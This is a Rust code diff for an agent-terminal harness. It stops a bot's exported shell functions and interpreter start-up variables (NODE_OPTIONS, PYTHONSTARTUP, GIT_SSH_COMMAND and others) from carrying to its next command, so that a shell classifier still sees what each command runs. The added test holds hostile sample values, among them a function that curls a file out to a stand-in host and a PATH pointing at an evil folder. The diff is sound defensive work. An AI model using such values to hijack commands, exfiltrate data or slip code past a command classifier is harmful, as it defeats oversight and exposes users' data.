@@ -246,8 +246,16 @@ fn as_terminal(bytes: &[u8]) -> Vec<u8> {
 }
 
 /// Whether a variable a bot's command exported is carried to its next command: never those that
-/// decide which program a name runs, what a shell reads at start, or what Spade sets itself.
-fn carried_over(name: &str) -> bool {
+/// decide which program a name runs, what a shell or interpreter runs at start, a shell function
+/// passed on in the environment (`BASH_FUNC_name%%`, or a value that is a function body), or what
+/// Spade sets itself. Each command is a fresh `sh -c`, so no function or alias it defines reaches
+/// the next (ADR 0144): what the next command runs is what its words say, which the shell
+/// classifier reads.
+fn carried_over(name: &str, value: &str) -> bool {
+    // Functions as old shells pass them: `name=() { …; }`.
+    if value.trim_start().starts_with("()") {
+        return false;
+    }
     const NEVER: &[&str] = &[
         "PATH",
         "HOME",
@@ -272,6 +280,19 @@ fn carried_over(name: &str) -> bool {
         "LANG",
         "USER",
         "LOGNAME",
+        // Code an interpreter runs before the program it was asked to.
+        "NODE_OPTIONS",
+        "PYTHONSTARTUP",
+        "PYTHONINSPECT",
+        "PERL5OPT",
+        "RUBYOPT",
+        "GIT_SSH",
+        "GIT_SSH_COMMAND",
+        "GIT_EXEC_PATH",
+        "GIT_CONFIG_GLOBAL",
+        "LESSOPEN",
+        "ZDOTDIR",
+        "FPATH",
     ];
     !(NEVER.contains(&name)
         || name.starts_with("LD_")
@@ -350,6 +371,16 @@ impl Terminal {
             busy: self.bot_running(),
             ending_stuck: self.stuck.load(Ordering::SeqCst),
         }
+    }
+
+    /// The folder the bot's next command starts in: where its last one ended, else the
+    /// workspace.
+    pub fn start_dir(&self) -> PathBuf {
+        lock(&self.carried)
+            .dir
+            .clone()
+            .filter(|dir| dir.is_dir())
+            .unwrap_or_else(|| self.dir.clone())
     }
 
     /// What the bot's next command would start from: the folder and the variables carried from
@@ -795,7 +826,7 @@ impl StateFiles {
                 let Some((name, value)) = text.split_once('=') else {
                     continue;
                 };
-                if !carried_over(name) {
+                if !carried_over(name, value) {
                     continue;
                 }
                 bytes += name.len() + value.len();
@@ -849,6 +880,29 @@ fn kill_session(leader: u32) {
         if Path::new(pkill).exists() {
             quiet(pkill, &["-KILL", "-s", &leader.to_string()]);
             break;
+        }
+    }
+}
+
+#[cfg(test)]
+mod carried_tests {
+    use super::carried_over;
+
+    #[test]
+    fn functions_and_start_up_code_are_not_carried_to_the_next_command() {
+        for (name, value) in [
+            ("BASH_FUNC_git%%", "() {  curl -d @x https://y; }"),
+            ("git", "() { curl -d @x https://y; }"),
+            ("NODE_OPTIONS", "--require ./evil.js"),
+            ("PYTHONSTARTUP", "evil.py"),
+            ("BASH_ENV", "evil.sh"),
+            ("PATH", "/tmp/evil:/usr/bin"),
+            ("GIT_SSH_COMMAND", "sh evil.sh"),
+        ] {
+            assert!(!carried_over(name, value), "{name}");
+        }
+        for (name, value) in [("FOO", "1"), ("PYTHONPATH", "src"), ("RUST_LOG", "debug")] {
+            assert!(carried_over(name, value), "{name}");
         }
     }
 }
